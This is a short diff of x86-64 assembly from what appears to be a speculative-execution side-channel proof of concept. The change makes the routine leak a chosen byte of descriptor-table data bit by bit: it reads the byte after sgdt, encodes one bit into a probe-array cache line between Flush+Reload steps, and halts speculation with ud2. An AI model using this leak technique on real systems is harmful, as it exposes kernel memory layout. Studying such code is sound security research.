@@ -105,9 +105,12 @@ SECTION .code
         push rcx
         push rdx
         push rsi
+        push r8
 
-        ;Move the arg in rcx, where we can use it with shr
+        ;Move the first arg (bit index) in rcx, where we can use it with shr
+        ;Second args (byte index) is put in r8
         mov rcx, rdi
+        mov r8, rsi
 
         ;Flush the F+R lines
         call flush
@@ -128,10 +131,22 @@ SECTION .code
         ;0.0 O
 
         sgdt [rdi]
-        mov rdi, QWORD [rdi+2]           
+        movzx rdi, BYTE [rdi+r8] 
+        nop
+        nop
+        nop          
         shr rdi, cl
-        and edi, 1     
+        nop
+        nop
+        nop         
+        and rdi, 1 
+        nop
+        nop
+        nop     
         shl rdi, 6 + GAP_SHIFT + 7
+        nop
+        nop
+        nop 
         mov ebx, DWORD [rsi+rdi]
 
         ud2                             ;Stop speculation
@@ -146,6 +161,7 @@ SECTION .code
 
     .end:
 
+        pop r8
         pop rsi
         pop rdx
         pop rcx
